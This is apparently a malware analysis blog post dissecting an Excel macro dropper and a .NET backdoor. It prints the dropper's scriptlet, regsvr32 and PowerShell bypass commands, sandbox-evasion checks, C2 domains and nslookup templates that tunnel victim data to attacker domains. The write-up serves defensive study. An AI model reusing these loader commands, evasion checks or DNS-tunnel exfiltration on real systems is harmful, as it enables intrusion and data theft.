---
layout: page
---

# <u>First Stage: Excel document [Dropper]</u>

`MD5: 8DC9F5450402AE799F5F8AFD5C0A8352`

The first stage of this malware is an excel document with a `macro`, it asks to click `Enable Content` to run the macro, the document doesn't contain any data (not so smart).

[![1](/home/night-wolf/Pictures/1.png)](/home/night-wolf/Pictures/1.png)

To view the macro, from the Developer tab **(File --> Options --> Customize Ribbon --> Developer Checkbox)** we can click Visual Basic and see the macro with the name **ThisWorkbook**.

The macro first writes a long powershell script to `%TEMP%\WINDOWSTEMP.ps1`, Then it writes an SCT script to the file `%TEMP%\12-B-366.txt`.

```java
<?XML version="1.0"?>
<scriptlet>
    <registration progid = "PoC" classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
        <script language="JScript">
            <![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("" + powershell_command + "", 0, true); ]]>
        </script>
    </registration>
</scriptlet>
```

Finally it runs this SCT file with the command

 `regsvr32.exe /s /n /u /i: %TEMP%\12-B-366.txt scrobj.dll` 

The SCT file will execute the powershell command

`powershell.exe -noexit -exec bypass -File %TEMP%\WINDOWSTEMP.ps1`

The powershell script contains a large base64 string which is decoded and Gzip decompressed then it's written to `%APPDATA%\Microsoft\Windows\Templates\WindowsTemplate.exe` and gets executed.

At last it creates a shortcut to this executable at the startup folder `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` with the name `OneDrive.lnk`(one way to achieve persistence but very easily detectable).

So the chain works as follows:

SCT script &nbsp; --<u>run</u>--> &nbsp; Powershell script &nbsp; --<u>drop</u>--> &nbsp; Final executable

## <u>Second Stage: .NET Executable</u>

The malware code is not obfuscated, very good. 

First the malware checks `sandboxEvision_controler` variable and if it's true (which is not in this sample), it tries some sandbox evasion techniques then it goes to the main functionality.

[![2](/home/night-wolf/Pictures/2.png)](/home/night-wolf/Pictures/2.png)

## Sandbox Evasion:

- check if windows BIOS version `SMBIOSBIOSVERSION` contains any of these strings:

  ```
  VBOX
  bochs
  qemu
  VirtualBox
  VM
  ```

- check if `win32_computersystem` matches `VMware`

- check that `TotalPhysicalMemory < 2900000000 bytes`

- check that `NumberOfProcessorCores < 1`

- check if any `Wireshark` or `Sysinternals` process is running

- check if there is any attached debugger

If any one of these conditions is true, the malware will exit.

[![3](/home/night-wolf/Pictures/3.png)](/home/night-wolf/Pictures/3.png) | [![4](/home/night-wolf/Pictures/4.png)](/home/night-wolf/Pictures/4.png)

## Persistence:

After the sandbox evasion, the malware checks `hasStartup` variable and if it's true (which is not in this sample), it copies it self to `%APPDATA%\OneDrive.exe` and creates a shortcut at the startup folder under the name `OneDrive.lnk`

Note that this step was already done by the powershell script which explains why the `hasStartup` variable is set to false.

[![5](/home/night-wolf/Pictures/5.png)](/home/night-wolf/Pictures/5.png)

## C2 Communications:

This malware uses a technique called DNS Tunneling which leverages the DNS requests to send and receive data (usually DNS requests are not filtered by the firewall which makes this technique very powerful).

```
C2 Domains:
    0ffice365.agency
    0nedrive.agency
    corewindows.agency
    microsoftonline.agency
    onedrive.agency
    sharepoint.agency
    skydrive.agency
    0ffice365.life
    0ffice365.services
    skydrive.services
```

The malware loops through the C2 domains and send a DNS query to each one of them, it first flushes the DNS cache with the command:

```
ipconfig /flushdns
```

Then is sends the DNS request, it has three types of requests:

```
normal request:       nslookup.exe -q={DNS_quest_type} {id}.{domain_name}
ac mode is enables:   nslookup.exe -timeout=5 -q={DNS_quest_type} {id}.ac.{domain_name}
debugger is attached: nslookup.exe -timeout=5 -q={DNS_quest_type} 676f6f646c75636b.ac.{domain_name}
```

Interestingly enough, if we decode `676f6f646c75636b` we get the value `goodluck`, the malware author is trying to be funny with the analyst :)

```
DNS query types:
    MX
    TXT
    A
    AAAA
```

The request id is generated by calling `GetCurrentProcess()` then transforming the process id to a string with these replacements:

```
0 --> h
1 --> i
2 --> j
3 --> k
4 --> l
5 --> m
6 --> n
7 --> o
8 --> p
9 --> q
```

In this case, the process id was `3206` which translates to `kjnh`, the id is prefixed with the `request_type` which is either `a,b,c or d`, the `comm_model` is appended to the end of the id which is just the letter 'c'.

Example of the connections:

[![6](/home/night-wolf/Pictures/6.png)](/home/night-wolf/Pictures/6.png)

- If the response contains any of these strings, the query function returns "cancel":

```
216.58.192.174
2a00:1450:4001:81a::200e
2200::
download.microsoft.com
ntservicepack.microsoft.com
windowsupdate.microsoft.com
update.microsoft.com
```

- If the response contains any of these strings, the query function moves to the next domain:

```
timeout
UnKnown can
Unspecified error
```

- If the response contains any of these strings, the query function returns the DNS response and exits:

```
canonical name
mx
namerserver
mail serve
address
```

After getting the response, the malware passes it to `magic()` function which takes two parameters: the DNS response and a state, the state can be one of these strings:

```
getjob
havejob
getid
```

At this stage the malware passes `getid` to get a unique id of length 2, if the response wasn't valid, the returned id is "0".

After looping through all the domains, the malware checks if the id has a length of 2 (which indicates that it successfully connected to one of the C2 domains), if not, the malware calls `queryTypesTest()` but this time with the waiting value doubled. The initial waiting value is 120 ms and the maximum allowed value is 7200 ms (which means this function can be called **6** time only).

In case of a successful connection, the malware sends the computer info along with the connections results to the C2 server, computer info includes: internal network IP, host name, domain name, username, if the user is admin, and some of the malware constants. It should look like this:

```
10.0.2.15|IEuser-PC|WORKGROUP|IEuser|01|0|0|1|1|0|cs
```

Here we can see the use of DNS Tunneling to send the data to the C2 server in `spliting()` function which is responsible for sending data, first it determines the chunk size by getting a random value between **[min_query_size, max_query_size]** which in in this sample is **[30, 32]** then it sends it in the DNS request in the form `data.domain`, pretty clever. 

Note that the max length for a subdomain cannot be longer than **63** characters, that's why the data is sent in chunks.

[![7](/home/night-wolf/Pictures/7.png)](/home/night-wolf/Pictures/7.png)

# Receiving Commands:

The malware queries the C2 server every second, it extracts commands using these regular expressions:

```
Address:\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})
Address:\\s+\\d+.\\d+.\\d+.\\d+
Address:\\s+40.112.(\\d+.\\d+)
\\s(\\w{3}).(domain_1|domain_2|...|domain_n)
```

If the malware receives a new command, it will start a new thread to execute it:

[![8](/home/night-wolf/Pictures/8.png)](/home/night-wolf/Pictures/8.png)

Here is the list of commands:

| Command                           | Description                                                  |
| --------------------------------- | ------------------------------------------------------------ |
| kill {thread_id}                  | kill a specific thread                                       |
| fileDownload {file_path}          | download a file from the victim's machine                    |
| fileUpload {file_path}            | upload a file to the victim's machine                        |
| importModule {powershell_command} | run a powershell command then add it to "modules" list       |
| ClearModules                      | clear "modules" list                                         |
| x_mode {OFF \| x_mode values}     | disable or enable x_mode (Google Drive mode)                 |
| testmode                          | test connection to C2 domains                                |
| showconfig                        | return config variables including the C2 domains and DNS query types |
| changeConfig                      | change config variables                                      |
| slp                               | change sleep and jitter values                               |
| exit                              | exit the malware process                                     |

# Google Drive As Alternative C2:

This malware have a mode called `x_mode` which enables it to use Google Drive as C2 server, this mode is disabled by default and can be enabled by receiving a command from one of the C2 DNS servers.

[![9](/home/night-wolf/Pictures/9.png)](/home/night-wolf/Pictures/9.png)

As you can see, there is configuration variables to be able to use this mode:










# External References:

[https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling](https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling)

[https://blog.centurylink.com/ismdoor-malware-continues-to-make-use-of-dns-tunneling](https://blog.centurylink.com/ismdoor-malware-continues-to-make-use-of-dns-tunneling/)